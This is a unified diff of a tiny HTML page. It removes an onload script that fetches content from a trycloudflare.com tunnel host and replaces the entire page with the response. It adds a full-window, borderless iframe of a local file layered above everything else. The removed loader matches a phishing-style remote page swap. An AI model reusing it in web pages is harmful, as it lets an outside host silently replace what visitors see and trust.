@@ -1,17 +1,8 @@
 <!DOCTYPE html>
 <html>
-    <body onload="javascript:{openCE();}">
-        <div id="content"></div>
-    <script>
-        function openCE() {
-            var xhr = new XMLHttpRequest();
-            xhr.onload = function() {
-                document.getElementsByTagName("html")[0].innerHTML= xhr.responseText;
-            };
-
-            xhr.open('GET', 'https://hop-arise-teens-informational.trycloudflare.com', true);
-            xhr.send(null);
-        }
-    </script>
+    <body>
+        <iframe src="mypage.html" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
+            Your browser doesn't support iframes
+        </iframe>
     </body>
-</html> 
+</html>
